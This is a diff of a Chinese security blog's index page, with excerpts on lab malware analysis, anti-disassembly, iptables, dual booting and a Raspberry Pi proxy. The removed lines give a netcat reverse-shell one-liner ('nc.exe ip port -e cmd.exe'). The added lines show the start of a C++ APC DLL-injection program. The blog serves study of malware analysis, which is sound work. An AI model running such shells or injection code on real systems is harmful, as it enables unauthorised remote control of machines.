@@ -183,7 +183,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/10/22/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -197,7 +197,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/" class="post-title-link" itemprop="url">netcat-反向shell</a>
+            <a href="/2017/10/22/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">对抗反汇编2</a>
         </h2>
 
         <div class="post-meta">
@@ -207,7 +207,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2017-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-06T00:00:00+08:00">2017-08-06</time>
+              <time title="创建时间：2017-10-22 00:00:00" itemprop="dateCreated datePublished" datetime="2017-10-22T00:00:00+08:00">2017-10-22</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -230,14 +230,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell</p>
-<p>1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe</p>
-<p>2.linux 主机执行 nc  -l  -p 80</p>
-<p>3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。</p>
-
+          <p>一、 样本基本信息</p>
+<p>样本来源：恶意代码实战中的Lab15-03.exe。</p>
+<p>二、分析过程</p>
+<p>IDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。</p>
+<p><img src="https://i.imgur.com/vd4KEI6.png" alt="xx1"></p>
+<p>由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit-&gt;Patch Program-&gt;change word ,把E9改为90，然后按c转换为代码就可以了。效果如图</p>
+<p><img src="https://i.imgur.com/Qtl0ZFP.png"></p>
+<p>继续往下看，发现有一个除零异常出现 ，</p>
+<p><img src="https://i.imgur.com/ng6kIn0.png"></p>
+<p>显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/#more" rel="contents">
+              <a class="btn" href="/2017/10/22/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -261,7 +266,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/10/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/iptables/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -275,7 +280,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/" class="post-title-link" itemprop="url">数据隐藏-ADS</a>
+            <a href="/2017/10/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/iptables/" class="post-title-link" itemprop="url">iptables 基础</a>
         </h2>
 
         <div class="post-meta">
@@ -285,7 +290,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2017-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-06T00:00:00+08:00">2017-08-06</time>
+              <time title="创建时间：2017-10-20 00:00:00" itemprop="dateCreated datePublished" datetime="2017-10-20T00:00:00+08:00">2017-10-20</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -293,7 +298,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
                 </span>
             </span>
 
@@ -308,12 +313,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p>
-<p>详见<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin">ADS</a></p>
-
+          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&amp;emsp;&amp;emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。</p>
+<p>&amp;emsp;&amp;emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。</p>
+<p>&amp;emsp;&amp;emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw–&gt;mangle–&gt;nat–&gt;filter</p>
+<p><img src="https://i.imgur.com/Fl0nfg8.png"></p>
+<p><img src="https://i.imgur.com/OHQyUMC.png"></p>
+<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><p>&amp;emsp常用操作命令	说明</p>
+<p>-A	在指定链尾部添加规则</p>
+<p>-D	删除匹配的规则</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/#more" rel="contents">
+              <a class="btn" href="/2017/10/20/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/iptables/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -337,7 +347,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/08/06/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/10/16/%E6%9D%82%E5%AD%A6/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -351,7 +361,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2017/08/06/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">汇编知识学习</a>
+            <a href="/2017/10/16/%E6%9D%82%E5%AD%A6/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">双系统安装（win10+ubuntu）</a>
         </h2>
 
         <div class="post-meta">
@@ -361,7 +371,581 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2017-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-06T00:00:00+08:00">2017-08-06</time>
+              <time title="创建时间：2017-10-16 00:00:00" itemprop="dateCreated datePublished" datetime="2017-10-16T00:00:00+08:00">2017-10-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">杂学</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1.我选择的 是win10加ubuntu双系统。</p>
+<p>2.准备工作</p>
+<pre><code>      U盘一个16g
+      win10系统
+      ubuntu系统
+</code></pre>
+<p>3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。</p>
+<p>4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。</p>
+<p>其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。&#x2F;boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分&#x2F;，15g-20g左右，剩下的可以全部给&#x2F;home。引导驱动器选择&#x2F;boot,然后继续安装正常方式来装就好了。</p>
+<p>4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择&#x2F;boot对应的就好了。此时重启你就会发现有两个候选操作系统了。</p>
+<p><img src="https://i.imgur.com/prFcTXH.png"></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/10/16/%E6%9D%82%E5%AD%A6/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/10/16/%E6%9D%82%E5%AD%A6/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fengchuiguo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengchuiguo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/10/16/%E6%9D%82%E5%AD%A6/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/" class="post-title-link" itemprop="url">树莓派透明代理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-10-16 00:00:00" itemprop="dateCreated datePublished" datetime="2017-10-16T00:00:00+08:00">2017-10-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">杂学</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1.安装vim</p>
+<p>连网之后，首先安装vim,便于后面的配置文件的编写。</p>
+<pre><code> sudo apt-get install vim
+</code></pre>
+<p>2.静态ip  </p>
+<p>图形界面貌似会失败，建议在配置文件里改：</p>
+<pre><code>sudo vim /etc/dhcpcd.conf
+</code></pre>
+<p>填写以下内容</p>
+<pre><code>interface eth0
+
+static ip_address=ip
+
+static routers=网关
+
+static domain_name_servers=223.5.5.5
+</code></pre>
+<p>3.配置路由转发：</p>
+<pre><code>sudo vim  /etc/sysctl.conf
+</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/10/16/%E6%9D%82%E5%AD%A6/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/10/16/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fengchuiguo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengchuiguo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/10/16/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/" class="post-title-link" itemprop="url">对抗反汇编1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-10-16 00:00:00" itemprop="dateCreated datePublished" datetime="2017-10-16T00:00:00+08:00">2017-10-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h5 id="方法总结如下："><a href="#方法总结如下：" class="headerlink" title="方法总结如下："></a>方法总结如下：</h5><h5 id="1、插入流氓字节，阻止真正的指令被反汇编"><a href="#1、插入流氓字节，阻止真正的指令被反汇编" class="headerlink" title="1、插入流氓字节，阻止真正的指令被反汇编"></a>1、插入流氓字节，阻止真正的指令被反汇编</h5><p>线性反汇编和面向代码流的反汇编：</p>
+<p>线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如：</p>
+<pre><code>    .text:00401035                 jz      short near ptr loc_401037+1
+    .text:00401037
+    .text:00401037 loc_401037:                             ; CODE XREF: .text:00401035j
+    .text:00401037                 call    near ptr 8B4C55C7h
+</code></pre>
+<p>观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察</p>
+<blockquote>
+<pre><code>.text:00401035                 jz      short loc_401038
+</code></pre>
+<p>   .text:00401035 ; —————————————————————————<br>            .text:00401037                 db 0E8h<br>        .text:00401038 ; —————————————————————————<br>        .text:00401038<br>        .text:00401038 loc_401038:                             ; CODE XREF: .text:00401035j<br>        .text:00401038                 mov     eax, [ebp+0Ch]</p>
+</blockquote>
+<p>这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。</p>
+<h5 id="2、固定条件的跳转指令"><a href="#2、固定条件的跳转指令" class="headerlink" title="2、固定条件的跳转指令"></a>2、固定条件的跳转指令</h5><pre><code>                               xor     eax, eax
+.text:00401035                 jz      short loc_401038
+</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/10/16/%E9%80%86%E5%90%91/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/10/16/%E9%80%86%E5%90%91/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fengchuiguo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengchuiguo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/10/16/%E9%80%86%E5%90%91/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/" class="post-title-link" itemprop="url">恶意代码重定向</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-10-16 00:00:00" itemprop="dateCreated datePublished" datetime="2017-10-16T00:00:00+08:00">2017-10-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>&amp;emsp;1.首先用strings查看字符串，发现<a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com/start.htm%EF%BC%8CUser-Agent%E5%AD%97%E6%A0%B7%EF%BC%8C%E4%BB%A5%E5%8F%8AC:/autobat.exe%EF%BC%8C%E7%96%91%E4%BC%BC%E7%BC%96%E7%A0%81%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p>
+<pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，
+InternetReadFile
+InternetCloseHandle
+InternetOpenUrlA
+InternetOpenA
+WININET.dll
+URLDownloadToCacheFileA 
+</code></pre>
+<p>&amp;emsp;&amp;emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/qDJ4DI5.png"><br>这些函数，这些都是重要信息需要关注的。</p>
+<p>&amp;emsp;&amp;emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com/start.htm',0%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6C:/autobat.exe%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E8%AF%A5%E5%87%BD%E6%95%B0%E4%B8%BAwrite_url,%E7%84%B6%E5%90%8E%E5%86%8D%E6%AC%A1%E8%B0%83%E7%94%A8401457%E5%87%BD%E6%95%B0%EF%BC%8C%E5%88%86%E6%9E%90%E5%8F%AF%E5%BE%97%E6%98%AF%E6%8A%8A%E8%AF%A5%E7%BD%91%E5%9D%80%E8%AF%BB%E5%88%B0%E7%BC%93%E5%86%B2%E5%8C%BAipbuffer,%E5%91%BD%E5%90%8D%E8%AF%A5%E5%87%BD%E6%95%B0%E4%B8%BAread_url,%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%BA1%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8E%A5%E4%B8%8B%E6%9D%A5%E8%B0%83%E7%94%A84011f3%E5%87%BD%E6%95%B0%EF%BC%8C%E9%A6%96%E5%85%88%E6%98%AF%E5%9C%A8szagent%E5%9C%B0%E5%9D%80%E5%AD%98%E6%94%BE%E7%A1%AC%E7%BC%96%E7%A0%81%E7%9A%84%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%86%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%E5%A4%9A%E5%86%99%E4%BA%86User-Agent%EF%BC%9A%E8%BF%99%E6%A0%B7%E4%BC%9A%E5%AF%BC%E8%87%B4%E5%AE%9E%E9%99%85%E5%BE%97%E5%88%B0%E7%9A%84%E5%A4%B4%E9%83%A8%E4%BC%9A%E5%87%BA%E7%8E%B0User-Agent:User-Agent:%E7%9A%84%E6%83%85%E5%86%B5%E3%80%82%E7%84%B6%E5%90%8E%E4%B8%8B%E9%9D%A2%E6%98%AFInternetOpenA%E5%92%8CInternetOpenUrlA%E5%87%BD%E6%95%B0%E6%89%93%E5%BC%80http://www.practicalmalwareanalysis.com/start.htm%EF%BC%8C%E6%89%93%E5%BC%80%E6%88%90%E5%8A%9F%E5%90%8EInternetReadFile%E8%AF%BB%E5%8F%96%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%EF%BC%8C">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p>
+<p><img src="https://i.imgur.com/ht0pUfZ.png"></p>
+<p>&amp;emsp;&amp;emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com,然后找到“96”的位置结束,然后把v7地址存放的内容赋到a3地址./">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p>
+<p><img src="https://i.imgur.com/akX3WUw.png"></p>
+<p>&amp;emsp;&amp;emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6&#x3D;1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2017/10/16/%E9%80%86%E5%90%91/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/09/16/%E9%80%86%E5%90%91/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fengchuiguo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fengchuiguo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/09/16/%E9%80%86%E5%90%91/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">dll注入之APC注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-09-16 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-16T00:00:00+08:00">2017-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：</p>
+<p>    1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</p>
+<p>    2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
+<p>    3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。<br>程序如下:</p>
+<pre><code>// TESTAPC2.cpp : 定义控制台应用程序的入口点。
+//
+
+#include &quot;stdafx.h&quot;
+#include &lt;string&gt;
+#include&lt;windows.h&gt;
+#include&lt;shlwapi.h&gt;
+#include&lt;tlhelp32.h&gt;
+#include&lt;winternl.h&gt;
+#pragma comment(lib,&quot;shlwapi.lib&quot;)
+#pragma comment(lib,&quot;ntdll.lib&quot;)
+using namespace std;
+//根据进程名获取PID
+DWORD GetPidFormName(wstring wsProcessname)
+&#123;
+    HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnaoshot == INVALID_HANDLE_VALUE)
+    &#123;
+        return false;
+    &#125;
+    PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;;
+    BOOL bok;
+    for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe))
+    &#123;
+        wstring wsNowProcName = pe.szExeFile;
+        if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL)
+        &#123;
+            CloseHandle(hSnaoshot);
+            return pe.th32ProcessID;
+        &#125;
+    &#125;
+    CloseHandle(hSnaoshot);
+    return 0;
+&#125;
+//dll 文件注入到进程wsProcessname
+BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[])
+&#123;
+    DWORD dwProcessId = GetPidFormName(wsProcessname);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+    if (!hProcess)
+    &#123;
+        return FALSE;
+    &#125;
